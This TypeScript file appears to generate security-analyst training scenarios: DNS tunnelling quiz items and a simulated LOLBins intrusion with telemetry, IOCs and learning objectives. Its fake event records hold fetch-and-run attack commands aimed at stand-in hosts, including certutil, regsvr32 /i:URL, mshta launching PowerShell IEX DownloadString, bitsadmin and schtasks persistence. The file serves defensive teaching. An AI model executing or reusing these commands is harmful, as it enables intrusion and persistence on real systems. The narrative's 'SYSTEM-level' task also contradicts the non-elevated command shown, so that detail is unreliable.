    narrative: `An attacker who had established initial access delivered dnscat2 via an encoded PowerShell command. The tool opened a covert C2 channel using DNS queries — encoding all communication as base32 subdomain names to the attacker-controlled domain c2-nexus-update.xyz. Commands were received via DNS TXT record responses. After recon commands, the attacker began exfiltrating sensitive data by encoding it into sequential DNS subdomain names, chunking a 29 KB file over 247 queries in 4 minutes — a DNS label is capped at 63 bytes, so each query carries only about 120 bytes of decoded data.`,
    learning_objectives: [
      "Recognize DNS tunneling indicators: high-entropy subdomains, long subdomain names, TXT record C2",
      "Understand why volume (847 queries/min vs. baseline 23) is a key detection signal",
      "Correlate PowerShell download → DNS volume spike → TXT record commands → data exfiltration chunks",
      "Identify how base32/base64 encoding is used to hide data in DNS labels",
      "Know what dnscat2 traffic looks like in DNS logs (Event ID 22 + Sysmon)",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),        phase: "Initial Access",   action: "Encoded PowerShell downloads and executes dnscat2 (update.exe)" },
      { ts: T(3 * MIN),  phase: "C2 Establishment", action: "DNS tunnel initiated — base32 encoded subdomains to c2-nexus-update.xyz" },
      { ts: T(6 * MIN),  phase: "C2 Active",        action: "847 DNS queries in 60 seconds — tunnel established and active" },
      { ts: T(10 * MIN), phase: "Command & Control", action: "C2 commands delivered via DNS TXT records (encoded: whoami /all, net user)" },
      { ts: T(14 * MIN), phase: "Exfiltration",     action: "Credential data encoded in DNS subdomain names — slow exfil begins" },
      { ts: T(18 * MIN), phase: "Exfiltration",     action: "247 sequential chunk queries — 29 KB file exfiltrated over DNS" },
    ],
    questions: [
      {
        id: "dns_q1_indicators",
        prompt: "The Sysmon Event ID 22 records from WS-ENG-3301 are the primary evidence. Which combination of fields inside those records is the tunnelling indicator?",
        kind: "single",
        options: [
          { value: "long_label_plus_txt", label: "53-character encoded labels and TXT lookups, all from one image in C:\\Windows\\Temp" },
          { value: "nxdomain_responses", label: "NXDOMAIN was returned for every name the workstation asked the resolver to look up" },
          { value: "udp_port_53", label: "The lookups travelled over UDP port 53 to the internal corporate resolver on 10.10.1.1" },
          { value: "aaaa_alongside_a", label: "AAAA record lookups were issued alongside the ordinary A record lookups by the host" },
        ],
        answer: "long_label_plus_txt",
        xp: 50,
        explanation:
          "Sysmon 22 gives you QueryName, QueryResults and — critically — Image. A 53-character random-looking label, TXT lookups, and an image path of C:\\Windows\\Temp\\update.exe are three independent oddities in one record. 'nxdomain_responses' is not what the logs show: QueryStatus is 0 and answers came back, and in any case a burst of NXDOMAIN is routine (search-suffix expansion, typos). 'udp_port_53' describes every DNS query on the network including the benign baseline, so it discriminates nothing. 'aaaa_alongside_a' is normal dual-stack behaviour — the baseline event itself lists A and AAAA as this host's query types.",
      },
      {
        id: "dns_q2_volume",
        prompt: "Sentinel counted 847 queries in 60 seconds against this host's 23-per-minute baseline. Why is that ratio a more durable detection than blocking the domain c2-nexus-update.xyz?",
        kind: "single",
        options: [
          { value: "volume_is_intrinsic", label: "Domains are cheap to rotate, but any DNS tunnel must send many queries to move data" },
          { value: "ttl_forces_repeats", label: "A very short record TTL forces the resolver to repeat each lookup many times over" },
          { value: "entropy_is_useless", label: "Subdomain entropy is the same for CDN hostnames, so only raw counts can be trusted" },
          { value: "only_rcode_logged", label: "A resolver can only measure the NXDOMAIN share of traffic, not the names requested" },
        ],
        answer: "volume_is_intrinsic",
        xp: 75,
        explanation:
          "Volume is a property of the technique, not of the infrastructure: a DNS label carries only tens of bytes, so moving anything meaningful forces thousands of queries. The attacker can register a new domain tomorrow, but cannot make the tunnel quiet. 'ttl_forces_repeats' confuses caching of *answers* with generation of *queries* — the client emits a new unique name per chunk, so TTL is irrelevant. 'entropy_is_useless' overstates a real caveat: CDN hostnames are indeed high-entropy, but this host's baseline entropy is 2.1 against encoded labels, so entropy still discriminates — it is just noisier than volume. 'only_rcode_logged' is false; the resolver logs the full QueryName, which is exactly where the encoded payload sits.",
      },
      {
        id: "dns_q3_encoding",
        prompt: "In evt_dns_05_exfil_start the label YWRtaW5AY3J5b3RlY2guY29t decodes to admin@cryotech.com. Why must the attacker chunk a file across hundreds of such queries instead of sending it in one?",
        kind: "single",
        options: [
          { value: "label_63_bytes", label: "A single DNS label is capped at 63 bytes, so one query carries well under 64 bytes" },
          { value: "base64_padding", label: "Base64 padding is illegal in DNS names, which caps any encoded label at 32 bytes" },
          { value: "udp_512_cap", label: "A DNS query may not exceed 512 bytes total, which limits each label to 128 bytes" },
          { value: "txt_carries_only", label: "Only TXT records are permitted to carry encoded payloads, and TXT is response-only" },
        ],
        answer: "label_63_bytes",
        xp: 75,
        explanation:
          "The wire format decides it: a label is at most 63 bytes and the whole name at most 255, and base32 or base64 expands data before it is even placed there — so roughly 120 bytes of real data per query, hence 247 queries for a 29 KB file. 'base64_padding' starts from a true fact (the '=' character is not a legal hostname character, which is why tunnels strip it or prefer base32) but invents a 32-byte cap that does not exist. 'udp_512_cap' cites a real limit on the whole DNS message, not on a label, and EDNS0 raises it anyway — it is not the binding constraint here. 'txt_carries_only' has the direction backwards: outbound data rides in the query *name*, and TXT is used for the inbound command channel, as evt_dns_04_txt_c2 shows.",
      },
      {
        id: "dns_q4_attribution",
        prompt: "Select the TWO facts, each drawn from a different event, that tie the DNS tunnel specifically to the PowerShell download rather than to a browser or a misconfigured client.",
        kind: "multi",
        options: [
          { value: "image_path_matches", label: "Sysmon's Image field and the EDR record both name C:\\Windows\\Temp\\update.exe" },
          { value: "hash_matches", label: "The SHA256 of the downloaded file equals InitiatingProcessSHA256 on the query events" },
          { value: "corporate_resolver", label: "The queries were sent to the corporate resolver rather than to an external DNS server" },
          { value: "sequential_chunks", label: "The exfiltration labels are numbered in sequence from chunk 0001 through chunk 0247" },
        ],
        answer: ["image_path_matches", "hash_matches"],
        xp: 100,
        explanation:
          "Attribution needs a process identity carried across sources. evt_dns_01_download records the file written to C:\\Windows\\Temp\\update.exe and its SHA256; evt_dns_process_queries records the same path and the same hash as InitiatingProcess on the query traffic, and Sysmon's Image agrees — that is the link. 'corporate_resolver' is exactly what a browser does too: nearly all endpoints send DNS to the internal resolver, so it says nothing about which process. 'sequential_chunks' does prove the traffic is machine-generated exfiltration, but it comes from a SIEM correlation record that carries no process identity at all, so it cannot bind the tunnel to update.exe.",
      },
    ],
  };
}

// =========================================================================
// Scenario 9: Living-off-the-Land (LOLBins) — certutil → regsvr32 → Persistence
// =========================================================================

export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundle {
  const B = new Date("2026-05-25T11:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victimHost = "WS-HR-1133";
  const victimEmail = "s.patel@nexacorp.com";
  const victimIp = "10.10.20.77";
  const payloadHash = makeSha256("evil_dll_nexacorp_lolbins");
  const certutilHash = makeSha256("certutil_downloaded_update_exe");
  // certutil.exe is a signed Windows binary — it cannot share a hash with the
  // payload it fetched, and the platform teaches hash-based pivoting.
  const certutilBinaryHash = makeSha256("certutil_exe_system_binary");
  // Same principle, two more files. `payloadHash` was previously reused as the
  // hash of the bitsadmin-fetched binary AND of the rundll32.exe process image,
  // so one SHA256 described three different files — in a scenario whose own
  // q1 explanation says "one SHA256 identifies one file". A student pivoting on
  // that hash would have concluded rundll32.exe was malware.
  const bitsPayloadHash   = makeSha256("bitsadmin_fetched_svchost_update_exe");
  const rundll32BinaryHash = makeSha256("rundll32_exe_system_binary");

  const events: TelemetryEvent[] = [
    // T-2min: Phishing email delivers the macro that spawns cmd.exe (initial access)
    {
      id: "evt_lol_00_phish", ts: T(-2 * MIN),
      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victimEmail, src_ip: "91.108.56.207",
      severity: "high", mitre_technique: "T1566.001", mitre_tactic: "TA0001",
      description: "s.patel received an email with a macro-enabled Word attachment (HR_Policy_Update.docm) from a domain registered 4 days ago. SPF and DKIM both failed.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "email.from.address": "hr-updates@nexacorp-portal.ru",
        "email.to.address": victimEmail,
        "email.subject": "HR Policy Update — Acknowledge by EOD",
        "email.attachment.name": "HR_Policy_Update.docm",
        "email.direction": "inbound",
        "file.size": "38912",
        "source.ip": "91.108.56.207",
        "spf.result": "fail", "dkim.result": "fail",
        "action_result": "delivered",
        "threat.category": "Phishing",
      },
    },
    // T+0: certutil.exe downloads payload (T1105)
    {
      id: "evt_lol_00b_macro_cmd", ts: T(-30_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1204.002", mitre_tactic: "TA0002",
      description: "WINWORD.EXE spawned a command shell on the HR workstation WS-HR-1133.",
      process: {
        name: "cmd.exe", pid: 4420, path: "C:\Windows\System32\cmd.exe",
        parent_name: "WINWORD.EXE", parent_pid: 3308,
        cmdline: "cmd.exe /c",
        user: "s.patel", integrity: "medium",
        hash: { sha256: makeSha256("cmd_exe_system_binary") },
      },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "cmd.exe",
        "FolderPath": "C:\Windows\System32\cmd.exe",
        "ProcessId": "4420",
        "ProcessCommandLine": "cmd.exe /c",
        "InitiatingProcessFileName": "WINWORD.EXE",
        "InitiatingProcessId": "3308",
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
      },
    },
    {
      id: "evt_lol_01_certutil", ts: T(0),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1105", mitre_tactic: "TA0011",
      description: "certutil.exe, spawned from cmd.exe, downloaded update.exe from malicious-update.ru on WS-HR-1133.",
      process: {
        name: "certutil.exe", pid: 4440, path: "C:\\Windows\\System32\\certutil.exe",
        parent_name: "cmd.exe", parent_pid: 4420,
        cmdline: "certutil -urlcache -split -f http://malicious-update.ru/update.exe update.exe",
        user: "s.patel", integrity: "medium",
        hash: { sha256: certutilBinaryHash },
      },
      file: { name: "update.exe", path: "C:\\Users\\s.patel\\Downloads\\update.exe", sha256: certutilHash, size: 204800 },
      network: { url: "http://malicious-update.ru/update.exe", domain: "malicious-update.ru", bytes_out: 204800 },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "certutil.exe",
        "FolderPath": "C:\\Windows\\System32\\certutil.exe",
        "ProcessCommandLine": "certutil -urlcache -split -f http://malicious-update.ru/update.exe update.exe",
        "InitiatingProcessFileName": "cmd.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\cmd.exe",
        "InitiatingProcessAccountName": "s.patel",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": certutilBinaryHash,
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "RemoteUrl": "malicious-update.ru",
        "RemoteIP": "91.108.56.207",
        "RemotePort": "80",
        "ReportId": "9284512",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
      },
    },

    // T+4min: regsvr32 executes malicious DLL/SCT via COM scriptlet (T1218.010)
    {
      id: "evt_lol_02_regsvr32", ts: T(4 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "critical", mitre_technique: "T1218.010", mitre_tactic: "TA0005",
      description: "regsvr32.exe ran with /i:http://attacker.com/payload.sct, loading a COM scriptlet from a remote URL.",
      process: {
        name: "regsvr32.exe", pid: 5512, path: "C:\\Windows\\System32\\regsvr32.exe",
        parent_name: "cmd.exe", parent_pid: 4420,
        cmdline: "regsvr32 /s /u /i:http://attacker.com/payload.sct scrobj.dll",
        user: "s.patel", integrity: "medium",
        hash: { sha256: makeSha256("regsvr32_system_binary") },
      },
      network: { url: "http://attacker.com/payload.sct", domain: "attacker.com", bytes_out: 8192 },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "regsvr32.exe",
        "FolderPath": "C:\\Windows\\System32\\regsvr32.exe",
        "ProcessCommandLine": "regsvr32 /s /u /i:http://attacker.com/payload.sct scrobj.dll",
        "InitiatingProcessFileName": "cmd.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\cmd.exe",
        "InitiatingProcessAccountName": "s.patel",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": makeSha256("regsvr32_system_binary"),
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "RemoteUrl": "attacker.com",
        "RemoteIP": "185.220.101.55",
        "RemotePort": "80",
        "ReportId": "9284556",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
      },
    },

    // T+7min: mshta.exe runs VBScript from URL (T1218.005)
    {
      id: "evt_lol_03_mshta", ts: T(7 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "critical", mitre_technique: "T1218.005", mitre_tactic: "TA0005",
      description: "mshta.exe, spawned by regsvr32.exe, ran a VBScript that launched hidden PowerShell to fetch stage2.ps1 from attacker.com.",
      process: {
        name: "mshta.exe", pid: 6100, path: "C:\\Windows\\System32\\mshta.exe",
        parent_name: "regsvr32.exe", parent_pid: 5512,
        cmdline: "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')\"\",0:close\")",
        user: "s.patel", integrity: "medium",
        hash: { sha256: makeSha256("mshta_exe_system_binary") },
      },
      network: { url: "http://attacker.com/stage2.ps1", domain: "attacker.com", bytes_out: 12288 },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "mshta.exe",
        "FolderPath": "C:\\Windows\\System32\\mshta.exe",
        "ProcessCommandLine": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\")...",
        "InitiatingProcessFileName": "regsvr32.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\regsvr32.exe",
        "InitiatingProcessAccountName": "s.patel",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": makeSha256("mshta_exe_system_binary"),
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "RemoteUrl": "attacker.com",
        "RemoteIP": "185.220.101.55",
        "ReportId": "9284601",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
      },
    },

    // T+10min: wmic.exe enumerates processes (T1057)
    {
      id: "evt_lol_03b_powershell", ts: T(7 * MIN + 20_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1059.001", mitre_tactic: "TA0002",
      description: "A hidden PowerShell process started under mshta.exe and downloaded stage2.ps1 into memory.",
      process: {
        name: "powershell.exe", pid: 6200, path: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        parent_name: "mshta.exe", parent_pid: 6100,
        cmdline: "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')",
        user: "s.patel", integrity: "medium",
        hash: { sha256: makeSha256("powershell_exe_system_binary") },
      },
      network: { url: "http://attacker.com/stage2.ps1", domain: "attacker.com", bytes_in: 12288 },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "powershell.exe",
        "FolderPath": "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "ProcessId": "6200",
        "ProcessCommandLine": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')",
        "InitiatingProcessFileName": "mshta.exe",
        "InitiatingProcessId": "6100",
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "RemoteUrl": "attacker.com",
      },
    },
    {
      id: "evt_lol_04_wmic", ts: T(10 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "medium", mitre_technique: "T1057", mitre_tactic: "TA0007",
      description: "wmic.exe ran process list brief under the same PowerShell session, enumerating all running processes on WS-HR-1133.",
      process: {
        name: "wmic.exe", pid: 6540, path: "C:\\Windows\\System32\\wbem\\wmic.exe",
        parent_name: "powershell.exe", parent_pid: 6200,
        cmdline: "wmic process list brief",
        user: "s.patel", integrity: "medium",
        hash: { sha256: makeSha256("wmic_exe_system_binary") },
      },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "wmic.exe",
        "FolderPath": "C:\\Windows\\System32\\wbem\\wmic.exe",
        "ProcessCommandLine": "wmic process list brief",
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "InitiatingProcessAccountName": "s.patel",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": makeSha256("wmic_exe_system_binary"),
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "ReportId": "9284648",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
      },
    },

    // T+13min: bitsadmin.exe used for persistence download (T1197)
    {
      id: "evt_lol_05_bitsadmin", ts: T(13 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1197", mitre_tactic: "TA0003",
      description: "bitsadmin.exe created a BITS job named NexaCorpUpdate that downloads svchost_update.exe from attacker.com to C:\\ProgramData\\nexacorp\\.",
      process: {
        name: "bitsadmin.exe", pid: 7002, path: "C:\\Windows\\System32\\bitsadmin.exe",
        parent_name: "powershell.exe", parent_pid: 6200,
        cmdline: "bitsadmin /transfer NexaCorpUpdate /download /priority normal http://attacker.com/persistence.exe C:\\ProgramData\\nexacorp\\svchost_update.exe",
        user: "s.patel", integrity: "medium",
        hash: { sha256: makeSha256("bitsadmin_system_binary") },
      },
      file: { name: "svchost_update.exe", path: "C:\\ProgramData\\nexacorp\\svchost_update.exe", sha256: bitsPayloadHash, size: 307200 },
      network: { url: "http://attacker.com/persistence.exe", domain: "attacker.com", bytes_out: 307200 },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "bitsadmin.exe",
        "FolderPath": "C:\\Windows\\System32\\bitsadmin.exe",
        "ProcessCommandLine": "bitsadmin /transfer NexaCorpUpdate /download /priority normal http://attacker.com/persistence.exe C:\\ProgramData\\nexacorp\\svchost_update.exe",
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "InitiatingProcessAccountName": "s.patel",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": makeSha256("bitsadmin_system_binary"),
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "RemoteUrl": "attacker.com",
        "RemoteIP": "185.220.101.55",
        "ReportId": "9284702",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
      },
    },

    // T+16min: rundll32.exe loads attacker DLL (T1218.011)
    {
      id: "evt_lol_06_rundll32", ts: T(16 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "critical", mitre_technique: "T1218.011", mitre_tactic: "TA0005",
      description: "rundll32.exe loaded an unsigned DLL (evil.dll) from C:\\Users\\Public, calling its DllMain export directly.",
      process: {
        name: "rundll32.exe", pid: 7480, path: "C:\\Windows\\System32\\rundll32.exe",
        parent_name: "powershell.exe", parent_pid: 6200,
        cmdline: "rundll32.exe C:\\Users\\Public\\evil.dll,DllMain",
        user: "s.patel", integrity: "medium",
        // The PROCESS here is rundll32.exe, a signed Microsoft binary. The
        // payload is the DLL it loads, in the `file` block below, which keeps
        // payloadHash. Setting the process hash to the payload's would teach a
        // student pivoting on SHA256 that rundll32.exe itself is malware.
        hash: { sha256: rundll32BinaryHash },
      },
      file: { name: "evil.dll", path: "C:\\Users\\Public\\evil.dll", sha256: payloadHash, size: 204800, extension: ".dll" },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "rundll32.exe",
        "FolderPath": "C:\\Windows\\System32\\rundll32.exe",
        "ProcessCommandLine": "rundll32.exe C:\\Users\\Public\\evil.dll,DllMain",
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "InitiatingProcessAccountName": "s.patel",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": rundll32BinaryHash,
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "FileOriginUrl": "C:\\Users\\Public\\evil.dll",
        "IsFileSigned": "false",
        "ReportId": "9284755",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
      },
    },

    // T+20min: Scheduled task created for persistence (T1053.005)
    {
      id: "evt_lol_07_schtask", ts: T(20 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "scheduled_task",
      hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
      severity: "high", mitre_technique: "T1053.005", mitre_tactic: "TA0003",
      description: "schtasks.exe created a task named NexaCorpHealthCheck that runs C:\\ProgramData\\nexacorp\\svchost_update.exe as SYSTEM every 5 minutes.",
      process: {
        name: "schtasks.exe", pid: 7900, path: "C:\\Windows\\System32\\schtasks.exe",
        parent_name: "powershell.exe", parent_pid: 6200,
        cmdline: "schtasks /create /tn \"NexaCorpHealthCheck\" /tr \"C:\\ProgramData\\nexacorp\\svchost_update.exe\" /sc minute /mo 5 /f",
        // Medium, matching the powershell.exe parent. This was High with
        // `/ru SYSTEM` on the command line, which needs local administrator —
        // and nothing in this LOLBin chain ever elevates: there is no UAC
        // bypass and no 4672 anywhere in the scenario. As written it taught
        // that a standard user can register a SYSTEM task.
        user: "s.patel", integrity: "medium",
        hash: { sha256: makeSha256("schtasks_system_binary") },
      },
      raw: {
        "event.provider": "Microsoft Defender ATP",
        "event.dataset": "DeviceProcessEvents",
        "event.action": "ProcessCreated",
        "event.outcome": "success",
        "DeviceName": victimHost,
        "ActionType": "ProcessCreated",
        "FileName": "schtasks.exe",
        "FolderPath": "C:\\Windows\\System32\\schtasks.exe",
        "ProcessCommandLine": "schtasks /create /tn \"NexaCorpHealthCheck\" /tr \"C:\\ProgramData\\nexacorp\\svchost_update.exe\" /sc minute /mo 5 /f",
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "InitiatingProcessAccountName": "s.patel",
        "InitiatingProcessAccountDomain": "NEXACORP",
        "ProcessIntegrityLevel": "Medium",
        "SHA256": makeSha256("schtasks_system_binary"),
        "AccountName": "s.patel",
        "AccountDomain": "NEXACORP",
        "ReportId": "9284811",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
      },
    },

    // ── CORRELATED: Baseline — certutil never used for internet download in 90 days
    {
      id: "evt_lol_baseline_certutil", ts: T(-5 * MIN),
      source: "siem", vendor: "Microsoft Sentinel",
      event_type: "ids_signature", severity: "informational",
      hostname: victimHost,
      description: "Microsoft Sentinel found zero prior uses of certutil.exe with the -urlcache flag on WS-HR-1133 in the past 90 days.",
      raw: {
        "event.action": "BaselineQuery",
        "siem.rule_name": "LOLBin_Baseline_Check",
        "siem.query": "process.name:certutil.exe AND process.cmdline:*urlcache*",
        "siem.lookback_days": "90",
        "siem.result_count": "0",
        "siem.host": victimHost,
        "event.outcome": "success",
      },
    },

    // ── CORRELATED: Network event — certutil external HTTP connection ──────────────
    {
      id: "evt_lol_certutil_net", ts: T(0),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection", severity: "high",
      mitre_technique: "T1105",
      src_ip: victimIp, dst_port: 80,
      hostname: victimHost,
      description: "WS-HR-1133 opened an outbound HTTP session to malicious-update.ru (91.108.56.207:80), allowed by rule ALLOW-OUTBOUND-HTTP.",
      raw: {
        "event.action": "allow",
        "source.ip": victimIp,
        "destination.ip": "91.108.56.207",
        "destination.port": "80",
        "destination.host": "malicious-update.ru",
        "pan.app": "web-browsing",
        "pan.action": "allow",
        "pan.rule": "ALLOW-OUTBOUND-HTTP",
        "url.category": "Unknown/Uncategorized",
        "network.bytes_in": "204800",
        "source.geo.country_name": "Russia",
      },
    },

    // ── CORRELATED: AV attempted detection on certutil download — evaded ──────────
    {
      id: "evt_lol_av_evade", ts: T(1_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint",
      event_type: "av_detection", severity: "medium",
      hostname: victimHost, user_email: victimEmail,
      description: "Microsoft Defender scanned update.exe, returned a low-confidence verdict, and allowed it to run.",
      raw: {
        "event.action": "DefenderDetection",
        "file.path": "C:\\Users\\s.patel\\Downloads\\update.exe",
        "file.hash.sha256": certutilHash,
        "file.name": "update.exe",
        "host.name": victimHost,
        "user.name": "NEXACORP\\s.patel",
        "action_result": "allowed",
        "quarantine.status": "not_quarantined",
      },
    },

    // ── CORRELATED: Network event — regsvr32 fetching SCT from attacker server ────
    {
      id: "evt_lol_regsvr_net", ts: T(4 * MIN + 5_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection", severity: "critical",
      mitre_technique: "T1218.010",
      src_ip: victimIp, dst_port: 80,
      hostname: victimHost,
      description: "WS-HR-1133 fetched http://attacker.com/payload.sct from 185.220.101.55:80, allowed by rule ALLOW-OUTBOUND-HTTP.",
      raw: {
        "event.action": "allow",
        "source.ip": victimIp,
        "destination.ip": "185.220.101.55",
        "destination.port": "80",
        "destination.host": "attacker.com",
        "pan.app": "web-browsing",
        "pan.action": "allow",
        "pan.rule": "ALLOW-OUTBOUND-HTTP",
        "url.full": "http://attacker.com/payload.sct",
        "url.category": "Unknown/Uncategorized",
        "network.bytes_in": "8192",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "domain", value: "malicious-update.ru",                                  reputation: "malicious", tags: ["c2-domain", "certutil-download-source"] },
    { type: "domain", value: "attacker.com",                                          reputation: "malicious", tags: ["c2-domain", "regsvr32-sct", "bitsadmin-download"] },
    { type: "sha256", value: payloadHash,                                             reputation: "malicious", tags: ["lolbins-payload", "evil-dll", "persistence-binary"] },
    { type: "sha256", value: certutilHash,                                            reputation: "malicious", tags: ["certutil-downloaded-payload"] },
    { type: "ip",     value: "185.220.101.55",                                        reputation: "malicious", tags: ["attacker-c2-ip", "regsvr32-sct-server", "bitsadmin-server"] },
    { type: "url",    value: "http://malicious-update.ru/update.exe",                 reputation: "malicious", tags: ["lolbin-download-url"] },
    { type: "url",    value: "http://attacker.com/payload.sct",                       reputation: "malicious", tags: ["squiblydoo-sct-url"] },
  ];

  return {
    scenario_id: scenarioId,
    title: "Living-off-the-Land (LOLBins) — certutil → regsvr32 → Persistence",
    threat_actor: "TA-GHOSTSHELL (APT Group)",
    attack_kind: "lolbins_defense_evasion",
    briefing: "Microsoft Sentinel fired a rare-command-line detection on WS-HR-1133 (s.patel) at 11:05, and the firewall logged outbound HTTP from the same host to two external addresses in that window. A mail delivery to this user is also queued for review.",
    narrative: `A phishing email delivered a macro-enabled document to an HR workstation, spawning cmd.exe and beginning a 7-step LOLBin attack chain: certutil downloaded the initial payload (bypassing download controls since certutil is a trusted Windows binary), regsvr32 executed a remote COM scriptlet (Squiblydoo — bypasses AppLocker), mshta loaded a second-stage VBScript from URL, wmic performed process discovery, bitsadmin downloaded a persistence binary via a BITS job, rundll32 loaded an unsigned DLL from a user-writable path, and finally schtasks created a SYSTEM-level scheduled task that executes every 5 minutes. Every step used built-in, trusted Windows binaries to evade detection.`,
    learning_objectives: [
      "Identify the 7 most commonly abused LOLBins: certutil, regsvr32, mshta, wmic, bitsadmin, rundll32, schtasks",
      "Understand why each LOLBin is suspicious in these contexts (certutil downloading from internet, regsvr32 /i:<URL>, etc.)",
      "Recognize the Squiblydoo technique (regsvr32 COM scriptlet execution) and AppLocker bypass",
